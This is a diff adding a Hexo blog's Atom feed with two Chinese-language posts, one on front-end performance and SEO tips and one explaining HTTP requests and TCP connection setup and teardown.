@@ -1,0 +1,312 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>小柯的博客</title>
+  <icon>https://www.gravatar.com/avatar/84905ec0938f7ba8c9b0ee6021837953</icon>
+  <subtitle>学无止境</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2018-08-15T09:36:11.015Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>小柯</name>
+    <email>1210822196@qq.com</email>
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>web前端开发常用的优化技巧汇总</title>
+    <link href="http://yoursite.com/2018/08/15/web%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BC%98%E5%8C%96%E6%8A%80%E5%B7%A7%E6%B1%87%E6%80%BB/"/>
+    <id>http://yoursite.com/2018/08/15/web前端开发常用的优化技巧汇总/</id>
+    <published>2018-08-15T08:29:16.000Z</published>
+    <updated>2018-08-15T09:36:11.015Z</updated>
+    
+    <content type="html"><![CDATA[<p>对于一个前端工程师，不仅要写好代码，还要考虑到性能方面的优化问题，那么我们可以从哪些方面进行性能的优化？<br>首先，我们先来看看“雅虎军规”的35条：</p><h1 id="“雅虎军规”35条"><a href="#“雅虎军规”35条" class="headerlink" title="“雅虎军规”35条"></a>“雅虎军规”35条</h1><ul><li>尽量减少 HTTP 请求个数——须权衡</li><li>使用 CDN（内容分发网络）</li><li>为文件头指定 Expires 或 Cache-Control ，使内容具有缓存性。</li><li>避免空的 src 和 href</li><li>使用 gzip 压缩内容</li><li>把 CSS 放到顶部</li><li>把 JS 放到底部</li><li>避免使用 CSS 表达式</li><li>将 CSS 和 JS 放到外部文件中</li><li>减少 DNS 查找次数</li><li>精简 CSS 和 JS</li><li>避免跳转</li><li>剔除重复的 JS 和 CSS</li><li>配置 ETags</li><li>使 AJAX 可缓存</li><li>尽早刷新输出缓冲</li><li>使用 GET 来完成 AJAX 请求</li><li>延迟加载</li><li>预加载</li><li>减少 DOM 元素个数</li><li>根据域名划分页面内容</li><li>尽量减少 iframe 的个数</li><li>避免 404</li><li>减少 Cookie 的大小</li><li>使用无 cookie 的域</li><li>减少 DOM 访问</li><li>开发智能事件处理程序</li><li>用 代替 @import</li><li>避免使用滤镜</li><li>优化图像</li><li>优化 CSS Spirite</li><li>不要在 HTML 中缩放图像——须权衡</li><li>favicon.ico要小而且可缓存</li><li>保持单个内容小于25K</li><li>打包组件成复合文本<a id="more"></a>在性能优化方面，我们可以从三个方面来考虑<h1 id="减少http请求的次数或者减少请求数据的大小"><a href="#减少http请求的次数或者减少请求数据的大小" class="headerlink" title="减少http请求的次数或者减少请求数据的大小"></a>减少http请求的次数或者减少请求数据的大小</h1>页面中每发送一次<code>HTTP</code>请求，都需要完成请求+响应这个完整的HTTP事务,会消耗一些时间，也可能会导致<code>HTTP</code>连接通道阻塞，为了提高页面加载速度和运行的性能，我们应该减少<code>HTTP</code>的请求次数和减少请求内容的大小(请求的内容越大，消耗的时间越长)<h2 id="1-采用CSS雪碧图技术-CSS-Sprit-CSS图片精灵-技术，把一些小图合并在一张大图上-使用的时候通过背景图片定位-定位到具体的某一张小图上"><a href="#1-采用CSS雪碧图技术-CSS-Sprit-CSS图片精灵-技术，把一些小图合并在一张大图上-使用的时候通过背景图片定位-定位到具体的某一张小图上" class="headerlink" title="1.采用CSS雪碧图技术(CSS Sprit/CSS图片精灵)技术，把一些小图合并在一张大图上,使用的时候通过背景图片定位,定位到具体的某一张小图上"></a>1.采用CSS雪碧图技术(CSS Sprit/CSS图片精灵)技术，把一些小图合并在一张大图上,使用的时候通过背景图片定位,定位到具体的某一张小图上</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.pubBg</span>&#123;</span><br><span class="line"><span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">'../img/sprit.png'</span>) no-repeat;</span><br><span class="line"><span class="attribute">background-size</span>:x y <span class="comment">/*=&gt;和原图大小保持一致的;*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line"><span class="attribute">background-position</span>:x y;<span class="comment">/*通过背景定位,定位到具体的位置，展示不同的图片即可*/</span></span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line">&lt;div class = 'pubBg box'&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="2、真实项目中，我们最好把CSS或者JS文件进行合并压缩；尤其是在移动端开发的时候，如果CSS或者JS文件内容不是很多，我们可以采取内嵌式，告别外链式，依次来减少HTTP请求次数，加快页面加载速度；"><a href="#2、真实项目中，我们最好把CSS或者JS文件进行合并压缩；尤其是在移动端开发的时候，如果CSS或者JS文件内容不是很多，我们可以采取内嵌式，告别外链式，依次来减少HTTP请求次数，加快页面加载速度；" class="headerlink" title="2、真实项目中，我们最好把CSS或者JS文件进行合并压缩；尤其是在移动端开发的时候，如果CSS或者JS文件内容不是很多，我们可以采取内嵌式，告别外链式，依次来减少HTTP请求次数，加快页面加载速度；"></a>2、真实项目中，我们最好把CSS或者JS文件进行合并压缩；尤其是在移动端开发的时候，如果CSS或者JS文件内容不是很多，我们可以采取内嵌式，告别外链式，依次来减少HTTP请求次数，加快页面加载速度；</h2><ul><li>1)CSS合并成一个，JS最好也合并成一个</li><li>2)首先通过一些工具(例如：webpack)把合并后的CSS或者JS压缩成xxx.min.js，减少文件大小</li><li>3)服务器端开启资源文件的GZIP压缩<br>…</li></ul><p>通过一些自动化工具完成CSS以及JS的合并压缩，或者再完成LESS转CSS，ES6转ES5等操作，我们把这种自动化构建模式，称之为前端<code>&quot;工程化&quot;</code>开发</p><h2 id="3、采用图片懒加载技术，在页面开始加载的时候，不请求真实的图片地址，而是用默认图占位，当页面加载完成后，再根据相关的条件依次记载真实图片-核心目是：减少页面首次加载HTTP请求的次数"><a href="#3、采用图片懒加载技术，在页面开始加载的时候，不请求真实的图片地址，而是用默认图占位，当页面加载完成后，再根据相关的条件依次记载真实图片-核心目是：减少页面首次加载HTTP请求的次数" class="headerlink" title="3、采用图片懒加载技术，在页面开始加载的时候，不请求真实的图片地址，而是用默认图占位，当页面加载完成后，再根据相关的条件依次记载真实图片(核心目是：减少页面首次加载HTTP请求的次数)"></a>3、<code>采用图片懒加载技术</code>，在页面开始加载的时候，不请求真实的图片地址，而是用默认图占位，当页面加载完成后，再根据相关的条件依次记载真实图片(核心目是：减少页面首次加载HTTP请求的次数)</h2><p>真实项目中，我们开始图片都不加载，页面首次加载完成，先把第一屏中可以看见的图片进行加载，随着页面滚动，再把下面区域中能够呈现出来的图片进行加载</p><p>根据图片懒加载技术，我们还可以扩充出,<strong><code>数据的懒加载</code></strong></p><ul><li>1)开始加载页面的时候，我们只把首屏或者前两屏的数据从服务器端进行请求(有些网站首屏数据是后端渲染好，整体返回给客户端呈现的)</li><li>2)当页面下拉，滚动到哪个区域，再把这个区域需要的数据进行请求(请求回来做数据绑定以及图片延迟加载)</li><li>3)分页展示技术采用的也是数据的懒加载思想实现的：如果我们请求获取的数据是很多的数据，我们最好分批请求，开始只请求第一页的数据，当用户点击第二页(微博是下拉到一定的距离之后，再请求第二页数据…)的时候再请求第二页的数据…</li><li><p>4、对于不经常更新的数据，最好使用浏览器的<code>304</code>缓存做处理(主要由服务器端处理)<br><strong>例如：</strong><br>第一次请求CSS和JS下来，浏览器会把请求的内容缓存在了，如果做了<code>304</code>处理，用户再次请求CSS和JS，直接从缓存中读取，不需要再去服务器获取了(减少了HTTP请求次数)<br>当用户强制刷新页面(CTRL+F5)或者当前缓存的CSS或JS发生了变动，都会重新的服务器端拉取<br>…</p><p>对于客户端来讲，我们还可以基于localStorage来做一些本地存储，例如：第一次请求的数据或者不经常更新的CSS和JS，我们都可以把内容存储在本地，下一次页面加载，我们从本地中获取即可，我们设定一定的期限或者一些标识，可以控制在某个阶段重新从服务器获取</p></li></ul><h2 id="5、使用字体图标代替一些页面中的位图-图片-，这样不仅做适配的时候方便，而且更加轻量级，而且减少了HTTP请求次数-类似于图片雪碧图"><a href="#5、使用字体图标代替一些页面中的位图-图片-，这样不仅做适配的时候方便，而且更加轻量级，而且减少了HTTP请求次数-类似于图片雪碧图" class="headerlink" title="5、使用字体图标代替一些页面中的位图(图片)，这样不仅做适配的时候方便，而且更加轻量级，而且减少了HTTP请求次数(类似于图片雪碧图)"></a>5、使用字体图标代替一些页面中的位图(图片)，这样不仅做适配的时候方便，而且更加轻量级，而且减少了HTTP请求次数(类似于图片雪碧图)</h2><h2 id="6、如果当前页面中出现了AUDIO或者VIDEO标签，我们最好设置它们的preload-none-页面加载的时候，音视频资源不进行加载，播放的时候再开始加载-减少页面首次加载HTTP请求的次数"><a href="#6、如果当前页面中出现了AUDIO或者VIDEO标签，我们最好设置它们的preload-none-页面加载的时候，音视频资源不进行加载，播放的时候再开始加载-减少页面首次加载HTTP请求的次数" class="headerlink" title="6、如果当前页面中出现了AUDIO或者VIDEO标签，我们最好设置它们的preload=none;页面加载的时候，音视频资源不进行加载，播放的时候再开始加载(减少页面首次加载HTTP请求的次数)"></a>6、如果当前页面中出现了AUDIO或者VIDEO标签，我们最好设置它们的<code>preload=none;页面加载的时候，音视频资源不进行加载，播放的时候再开始加载</code>(减少页面首次加载HTTP请求的次数)</h2><p> <code>preload=auto;</code>页面首次加载的时候就把音视频资源进行加载了<br> <code>preload=metadata;</code>页面首次加载的时候只把音视频资源的头部信息进行加载 </p><h2 id="7、在客户端和服务器端进行数据通信的时候，我们尽量采用JSON格式进行数据传输"><a href="#7、在客户端和服务器端进行数据通信的时候，我们尽量采用JSON格式进行数据传输" class="headerlink" title="7、在客户端和服务器端进行数据通信的时候，我们尽量采用JSON格式进行数据传输"></a>7、在客户端和服务器端进行数据通信的时候，我们尽量采用JSON格式进行数据传输</h2><p><strong>[优势]</strong><br>1）JSON格式的数据，能够清晰明了的展示出数据结构，而且也方便我们获取和操作<br>2）相对于很早以前的XML格式传输，JSON格式的数据更加轻量级<br>3）客户端和服务器端都支持JSON格式数据的处理，处理起来非常的方便<br>真实项目中，并不是所有的数据都要基于JSON，我们尽可能这样做，但是对于某些特殊需求(例如：文件流的传输或者文档流的传输)，使用JSON就不合适了</p><h2 id="8、采用CDN加速"><a href="#8、采用CDN加速" class="headerlink" title="8、采用CDN加速"></a>8、采用CDN加速</h2><p> <strong>CDN：</strong> 分布式(地域分布式)[很烧钱]</p><p><strong>本质上：<code>真正的性能优化是由硬件做依托的</code></strong></p><h1 id="关于编写代码时候的一些优化技巧"><a href="#关于编写代码时候的一些优化技巧" class="headerlink" title="关于编写代码时候的一些优化技巧"></a>关于编写代码时候的一些优化技巧</h1><p>除了减少HTTP请求次数和减少请求数据的大小可以优化性能，我们在编写代码的时候，也可以进行一些优化，让页面的性能有所提升(有些不好的代码编写习惯，会导致页面性能消耗太大，例如：内存泄露)</p><h2 id="1、在编写JS代码的时候，尽量减少对DOM的操作-VUE和react框架在这方面处理的非常不错"><a href="#1、在编写JS代码的时候，尽量减少对DOM的操作-VUE和react框架在这方面处理的非常不错" class="headerlink" title="1、在编写JS代码的时候，尽量减少对DOM的操作(VUE和react框架在这方面处理的非常不错)"></a>1、在编写JS代码的时候，尽量减少对DOM的操作(VUE和react框架在这方面处理的非常不错)</h2><p>在JS中操作DOM是一个非常消耗性能的事情，但是我们又不可避免的操作DOM，我们只能尽量减少对它的操作</p><p><strong>[操作DOM的弊端]</strong></p><ul><li>1)DOM存在映射机制(JS中的DOM元素对象和页面中的DOM结构是存在映射机制的，一改则都改)，这种映射机制，是浏览器按照W3C标准完成对JS语言的构建和DOM的构建(<code>其实就是构建了一个监听机制</code>)，操作DOM是同时要修改两个地方，相对于一些其他的JS编程来说是消耗性能的</li><li>2)页面中的DOM结构改变或者样式改变，会触发浏览器的回流(浏览器会把DOM结构重新进行计算，这个操作很耗性能)和重绘(<code>把一个元素的样式重新渲染</code>)</li></ul><h2 id="2、编写代码的时候，更多的使用异步编程"><a href="#2、编写代码的时候，更多的使用异步编程" class="headerlink" title="2、编写代码的时候，更多的使用异步编程"></a>2、编写代码的时候，更多的使用异步编程</h2><p> <strong>同步编程会导致：</strong>上面东西完不成，下面任务也做不了，我们开发的时候，可以把某一区域模块都设置为异步编程，这样只要模块之间没有必然的先后顺序，都可以独立进行加载，不会受到上面模块的堵塞影响(用的不多)</p><p> 尤其是<code>ajax</code>数据请求，我们一般都要使用异步编程，最好是基于<code>promise</code>设计模式进行管理(项目中经常使用<code>fetch、VUE axios</code>等插件来进行<code>ajax</code>请求处理，因为这些插件中就是基于<code>promise</code>设计模式对<code>ajax</code>进行的封装处理)</p><h2 id="3、在真实项目中，我们尽可能避免一次性循环过多数据-因为循环操作是同步编程-，尤其是要避免while导致的死循环操作"><a href="#3、在真实项目中，我们尽可能避免一次性循环过多数据-因为循环操作是同步编程-，尤其是要避免while导致的死循环操作" class="headerlink" title="3、在真实项目中，我们尽可能避免一次性循环过多数据(因为循环操作是同步编程)，尤其是要避免while导致的死循环操作"></a>3、在真实项目中，我们尽可能避免一次性循环过多数据(因为循环操作是同步编程)，尤其是要避免while导致的死循环操作</h2><h2 id="4、CSS选择器优化"><a href="#4、CSS选择器优化" class="headerlink" title="4、CSS选择器优化"></a>4、CSS选择器优化</h2><p> 1）尽量减少对标签选择器的使用<br> 2）尽可能少使用ID选择器，多使用样式类选择器(通用性强)<br> 3）减少使用选择器时候前面的前缀，例如：<code>headerBox .nav .left a{}</code>(选择器是从右向左查找的)、在命名的时候做优化。</p><h2 id="5、避免使用CSS表达式"><a href="#5、避免使用CSS表达式" class="headerlink" title="5、避免使用CSS表达式"></a>5、避免使用CSS表达式</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*CSS表达式*/</span></span><br><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line"><span class="attribute">background-color</span>:<span class="built_in">expression</span>((new Date()).<span class="built_in">getHours</span>()%<span class="number">2</span>?<span class="string">'red'</span>:<span class="string">'blue'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6、减少页面中的冗余代码，尽可能提高方法的重复使用率：”低耦合高内聚”"><a href="#6、减少页面中的冗余代码，尽可能提高方法的重复使用率：”低耦合高内聚”" class="headerlink" title="6、减少页面中的冗余代码，尽可能提高方法的重复使用率：”低耦合高内聚”"></a>6、减少页面中的冗余代码，尽可能提高方法的重复使用率：”低耦合高内聚”</h2><h2 id="7、最好CSS挡在head中，而JS放在body尾部，让页面加载的时候，先加载CSS，再加载JS-先呈现页面，再给用户提供操作"><a href="#7、最好CSS挡在head中，而JS放在body尾部，让页面加载的时候，先加载CSS，再加载JS-先呈现页面，再给用户提供操作" class="headerlink" title="7、最好CSS挡在head中，而JS放在body尾部，让页面加载的时候，先加载CSS，再加载JS(先呈现页面，再给用户提供操作)"></a>7、最好CSS挡在head中，而JS放在body尾部，让页面加载的时候，先加载CSS，再加载JS(先呈现页面，再给用户提供操作)</h2><h2 id="8、JS中避免使用eval"><a href="#8、JS中避免使用eval" class="headerlink" title="8、JS中避免使用eval"></a>8、JS中避免使用eval</h2><p> 1）性能消耗大<br> 2）代码压缩后，容易出现代码执行错乱问题</p><h2 id="9、JS中尽量减少闭包的使用"><a href="#9、JS中尽量减少闭包的使用" class="headerlink" title="9、JS中尽量减少闭包的使用"></a>9、JS中尽量减少闭包的使用</h2><p> 1）闭包会形成一个不销毁的栈内存，过多的栈内存累积会影响页面的性能<br> 2）还会容易导致内存的泄露</p><p> 闭包也有自己的优势：保存和保护，我们只能尽量减少，但是无可避免</p><h2 id="10、在做DOM事件绑定的时候，尽量避免一个个的事件绑定，而是采用性能更高的事件委托来实现"><a href="#10、在做DOM事件绑定的时候，尽量避免一个个的事件绑定，而是采用性能更高的事件委托来实现" class="headerlink" title="10、在做DOM事件绑定的时候，尽量避免一个个的事件绑定，而是采用性能更高的事件委托来实现"></a>10、在做DOM事件绑定的时候，尽量避免一个个的事件绑定，而是采用性能更高的事件委托来实现</h2><p><strong>事件委托(事件代理)</strong></p><p>把事件绑定给外层，当里面的后代元素相关行为被触发，外层容器绑定的方法也会被触发执行(冒泡传播机制导致)，通过事件源是谁，我们做不同的操作即可</p><h2 id="11、尽量使用CSS3动画代替JS动画，因为CSS3的动画或者变形都开启了硬件加速，性能比JS动画好"><a href="#11、尽量使用CSS3动画代替JS动画，因为CSS3的动画或者变形都开启了硬件加速，性能比JS动画好" class="headerlink" title="11、尽量使用CSS3动画代替JS动画，因为CSS3的动画或者变形都开启了硬件加速，性能比JS动画好"></a>11、尽量使用CSS3动画代替JS动画，因为CSS3的动画或者变形都开启了硬件加速，性能比JS动画好</h2><h2 id="12、编写JS代码的时候尽可能使用设计模式来构建体系，方便后期的维护，也提高了扩充性等"><a href="#12、编写JS代码的时候尽可能使用设计模式来构建体系，方便后期的维护，也提高了扩充性等" class="headerlink" title="12、编写JS代码的时候尽可能使用设计模式来构建体系，方便后期的维护，也提高了扩充性等"></a>12、编写JS代码的时候尽可能使用设计模式来构建体系，方便后期的维护，也提高了扩充性等</h2><h2 id="13、CSS中减少对滤镜的使用，页面中也减少对flash的使用"><a href="#13、CSS中减少对滤镜的使用，页面中也减少对flash的使用" class="headerlink" title="13、CSS中减少对滤镜的使用，页面中也减少对flash的使用"></a>13、CSS中减少对滤镜的使用，页面中也减少对flash的使用</h2><h1 id="关于页面SEO优化技巧"><a href="#关于页面SEO优化技巧" class="headerlink" title="关于页面SEO优化技巧"></a>关于页面SEO优化技巧</h1><h2 id="1、页面中杜绝出现死链接-404页面-，而且对于用户输入一个错误页面，我们要引导到404提示页面中-服务器处理的"><a href="#1、页面中杜绝出现死链接-404页面-，而且对于用户输入一个错误页面，我们要引导到404提示页面中-服务器处理的" class="headerlink" title="1、页面中杜绝出现死链接(404页面)，而且对于用户输入一个错误页面，我们要引导到404提示页面中(服务器处理的)"></a>1、页面中杜绝出现死链接(404页面)，而且对于用户输入一个错误页面，我们要引导到404提示页面中(服务器处理的)</h2><h2 id="2、避免浏览器中异常错误的抛出"><a href="#2、避免浏览器中异常错误的抛出" class="headerlink" title="2、避免浏览器中异常错误的抛出"></a>2、避免浏览器中异常错误的抛出</h2><p> 尽可能避免代码出错<br> 使用try catch做异常信息的捕获<br> …</p><h2 id="3、增加页面关键词优化"><a href="#3、增加页面关键词优化" class="headerlink" title="3、增加页面关键词优化"></a>3、增加页面关键词优化</h2>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;对于一个前端工程师，不仅要写好代码，还要考虑到性能方面的优化问题，那么我们可以从哪些方面进行性能的优化？&lt;br&gt;首先，我们先来看看“雅虎军规”的35条：&lt;/p&gt;
+&lt;h1 id=&quot;“雅虎军规”35条&quot;&gt;&lt;a href=&quot;#“雅虎军规”35条&quot; class=&quot;headerlink&quot; title=&quot;“雅虎军规”35条&quot;&gt;&lt;/a&gt;“雅虎军规”35条&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;尽量减少 HTTP 请求个数——须权衡&lt;/li&gt;
+&lt;li&gt;使用 CDN（内容分发网络）&lt;/li&gt;
+&lt;li&gt;为文件头指定 Expires 或 Cache-Control ，使内容具有缓存性。&lt;/li&gt;
+&lt;li&gt;避免空的 src 和 href&lt;/li&gt;
+&lt;li&gt;使用 gzip 压缩内容&lt;/li&gt;
+&lt;li&gt;把 CSS 放到顶部&lt;/li&gt;
+&lt;li&gt;把 JS 放到底部&lt;/li&gt;
+&lt;li&gt;避免使用 CSS 表达式&lt;/li&gt;
+&lt;li&gt;将 CSS 和 JS 放到外部文件中&lt;/li&gt;
+&lt;li&gt;减少 DNS 查找次数&lt;/li&gt;
+&lt;li&gt;精简 CSS 和 JS&lt;/li&gt;
+&lt;li&gt;避免跳转&lt;/li&gt;
+&lt;li&gt;剔除重复的 JS 和 CSS&lt;/li&gt;
+&lt;li&gt;配置 ETags&lt;/li&gt;
+&lt;li&gt;使 AJAX 可缓存&lt;/li&gt;
+&lt;li&gt;尽早刷新输出缓冲&lt;/li&gt;
+&lt;li&gt;使用 GET 来完成 AJAX 请求&lt;/li&gt;
+&lt;li&gt;延迟加载&lt;/li&gt;
+&lt;li&gt;预加载&lt;/li&gt;
+&lt;li&gt;减少 DOM 元素个数&lt;/li&gt;
+&lt;li&gt;根据域名划分页面内容&lt;/li&gt;
+&lt;li&gt;尽量减少 iframe 的个数&lt;/li&gt;
+&lt;li&gt;避免 404&lt;/li&gt;
+&lt;li&gt;减少 Cookie 的大小&lt;/li&gt;
+&lt;li&gt;使用无 cookie 的域&lt;/li&gt;
+&lt;li&gt;减少 DOM 访问&lt;/li&gt;
+&lt;li&gt;开发智能事件处理程序&lt;/li&gt;
+&lt;li&gt;用 代替 @import&lt;/li&gt;
+&lt;li&gt;避免使用滤镜&lt;/li&gt;
+&lt;li&gt;优化图像&lt;/li&gt;
+&lt;li&gt;优化 CSS Spirite&lt;/li&gt;
+&lt;li&gt;不要在 HTML 中缩放图像——须权衡&lt;/li&gt;
+&lt;li&gt;favicon.ico要小而且可缓存&lt;/li&gt;
+&lt;li&gt;保持单个内容小于25K&lt;/li&gt;
+&lt;li&gt;打包组件成复合文本&lt;/li&gt;&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="web前端" scheme="http://yoursite.com/tags/web%E5%89%8D%E7%AB%AF/"/>
+    
+      <category term="性能优化" scheme="http://yoursite.com/tags/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>TCP/IP、http等知识梳理</title>
+    <link href="http://yoursite.com/2018/08/15/TCP-IP%E3%80%81http%E7%AD%89%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/"/>
+    <id>http://yoursite.com/2018/08/15/TCP-IP、http等知识梳理/</id>
+    <published>2018-08-15T00:52:51.000Z</published>
+    <updated>2018-08-15T08:23:01.894Z</updated>
+    
+    <content type="html"><![CDATA[<p><span id="busuanzi_container_page_pv">  本文总阅读量<span id="busuanzi_value_page_pv"></span>次</span></p><h1 id="前后端通信"><a href="#前后端通信" class="headerlink" title="前后端通信"></a>前后端通信</h1><p>先从一道面试题开始：<br>在面试的时候经常被问，当我们在浏览器地址栏中输入一个URL地址,到最后看到页面,中间都经历了哪些事情?<br>我们从客户端和服务器交互模型角度来回答这个问题：<br>假设我们访问的是 <a href="https://www.baidu.com/这个地址" target="_blank" rel="noopener">https://www.baidu.com/这个地址</a> ，回车键之后，我们可以看到的百度页面</p><ul><li>百度页面并没用在我们自己的客户端本地，我们输入地址之后，才请求过来的</li><li>输入不同的域名可以看到不同的页面</li><li>有的网址是https:,有的是http(也有ftp)</li><li>需要客户端联网才能完成这些事情<br>那这一过程都经历了什么事情呢？<h2 id="request请求阶段"><a href="#request请求阶段" class="headerlink" title="request请求阶段"></a>request请求阶段</h2></li><li>首先根据客户端输入的域名，到DNS服务器上进行反解析(通过域名找到对应服务器的外网IP)</li><li>通过找到的外网IP，找到对应的服务器</li><li>通过在地址栏中输入的端口号(没有输入时因为不同协议有自己默认的端口号)找到服务器上发布的对应的项目<h2 id="response响应阶段"><a href="#response响应阶段" class="headerlink" title="response响应阶段"></a>response响应阶段</h2></li><li>真正的服务器接收到响应，根据你的请求信息，进行资源的整理；并且把相应的资源通过HTTP返给客户端；(html,css，js返回的不是文件)</li><li>把从服务器请求过来的数据，资源进行整理；处理成浏览器可识别的文件；<h2 id="浏览器自主渲染的过程"><a href="#浏览器自主渲染的过程" class="headerlink" title="浏览器自主渲染的过程"></a>浏览器自主渲染的过程</h2></li><li>先把HTML文件进行过滤解析，形成DOM树；节点与节点之间的一个组合</li><li>代码从上到下解析，形成CSS树；</li><li>把DOM树和css树进行重新组合，形成render树；是真正最后渲染的树；<a id="more"></a>我们上面说的协议，一般有HTTP、TCP、IP等<br>那协议是什么呢？协议的必要性在哪？</li><li>简单来说，协议就是计算机与计算机之间通过网络通信时，事先达成的一种 “约定”。这种“约定”使不同厂商的设备、不同的CPU以及不同操作系统组成的计算机之间，只要遵循相同的协议就能够实现通信。这就好比一个中国人说汉语一个外国人说英语使用不同的国家语言进行沟通，怎么也无法理解。如果两个人约定好 都说中文或英文，就可以互相沟通通信。协议分为很多种，每一种协议都明确界定了它的行为规范。两台计算机必须能够支持相同的协议，并遵循相同协议进行处理，这样才能实现相互通信。</li></ul><h1 id="TCP-IP协议"><a href="#TCP-IP协议" class="headerlink" title="TCP/IP协议"></a>TCP/IP协议</h1><p><strong>TCP/IP</strong> 是用于因特网 (Internet) 的通信协议。 TCP/IP 通信协议是对计算机必须遵守的规则的描述，只有遵守这些规则，计算机之间才能进行通信。</p><ul><li>TCP (Transmission Control Protocol)和UDP(User Datagram Protocol)协议属于传输层协议。其中TCP提供IP环境下的数据可靠传输，它提供的服务包括数据流传送、可靠性、有效流控、全双工操作和多路复 用。通过面向连接、端到端和可靠的数据包发送。通俗说，它是事先为所发送的数据开辟出连接好的通道，然后再进行数据发送；而UDP则不为IP提供可靠性、 流控或差错恢复功能。一般来说，TCP对应的是可靠性要求高的应用，而UDP对应的则是可靠性要求低、传输经济的应用。 TCP支持的应用协议主要有：Telnet、FTP、SMTP等； UDP支持的应用层协议主要有：NFS（网络文件系统）、SNMP（简单网络管理协议）、DNS（主域名称系统）、TFTP（通用文件传输协议）等。 TCP/IP协议与低层的数据链路层和物理层无关，这也是TCP/IP的重要特点<br>TCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接:<h2 id="三次握手的过程"><a href="#三次握手的过程" class="headerlink" title="三次握手的过程"></a>三次握手的过程</h2></li><li>第一次握手：客户端发送SYN码数据包发送给服务器，客户端要求和服务器建立连接</li><li>第二次握手：服务端接收到联机请求会发送ACK码到客户端，是要建立联机吗？</li><li>第三次握手：客户端接收到服务端的ACK码，验证是否正确，如果正确，则再次发送ACK，建立连接</li><li>三次握手之后，客户端和服务端联机成功，可以发送数据<br>一个TCP连接必须要经过三次“对话”才能建立起来，其中的过程非常复杂，只简单的 描述下这三次对话的简单过程：主机A向主机B发出连接请求数据包：“我想给你发数据，可以吗？”，这是第一次对话；主机B向主机A发送同意连接和要求同步 （同步就是两台主机一个在发送，一个在接收，协调工作）的数据包：“可以，你什么时候发？”，这是第二次对话；主机A再发出一个数据包确认主机B的要求同 步：“我现在就发，你接着吧！”，这是第三次对话。三次“对话”的目的是使数据包的发送和接收同步，经过三次“对话”之后，主机A才向主机B正式发送数 据。<br><img src="/images/三次握手.jpg" alt="三次握手过程"><br>客户端和服务端发送数据是双向的；客户端给服务端传递的是路径、参数，随机的；服务端给客户端传输自己的资源，文件，数据；<h2 id="四次挥手的过程"><a href="#四次挥手的过程" class="headerlink" title="四次挥手的过程"></a>四次挥手的过程</h2></li><li>1.当客户端发送数据结束，需要发送fin告诉服务器，数据传输结束；</li><li>2.服务端返回给客户端一个ACK码，知道客户端数据传输完毕；客户端接收到ACK，就会把发送到服务端的通道进行关闭；</li><li>3.服务端数据传输结束之后，也会发送fin给客户端</li><li>4.当客户端接收数据完毕之后，会发送ACK给服务端，服务端可以安心关闭传输数据的通道。<br>当客户A 没有东西要发送时就要释放 A 这边的连接，A会发送一个报文（没有数据），其中 FIN 设置为1, 服务器B收到后会给应用程序一个信，这时A那边的连接已经关闭，即A不再发送信息（但仍可接收信息）。 A收到B的确认后进入等待状态，等待B请求释放连接， B数据发送完成后就向A请求连接释放，也是用FIN=1 表示， 并且用 ack = u+1(如图）， A收到后回复一个确认信息，并进入 TIME_WAIT 状态， 等待 2MSL 时间。<br><img src="/images/四次挥手.jpg" alt="四次挥手过程"><h2 id="为什么需要等待呢？"><a href="#为什么需要等待呢？" class="headerlink" title="为什么需要等待呢？"></a>为什么需要等待呢？</h2>为了这种情况： B向A发送 FIN = 1 的释放连接请求，但这个报文丢失了， A没有接到不会发送确认信息， B 超时会重传，这时A在 WAIT_TIME 还能够接收到这个请求，这时再回复一个确认就行了。（A收到 FIN = 1 的请求后 WAIT_TIME会重新记时）<br>另外服务器B存在一个保活状态，即如果A突然故障死机了，那B那边的连接资源什么时候能释放呢？ 就是保活时间到了后，B会发送探测信息， 以决定是否释放连接<h2 id="为什么握手是三次，挥手是四次的呢？"><a href="#为什么握手是三次，挥手是四次的呢？" class="headerlink" title="为什么握手是三次，挥手是四次的呢？"></a>为什么握手是三次，挥手是四次的呢？</h2></li><li>因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，”你发的FIN报文我收到了”。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;span id=&quot;busuanzi_container_page_pv&quot;&gt;  本文总阅读量&lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;次&lt;/span&gt;&lt;/p&gt;
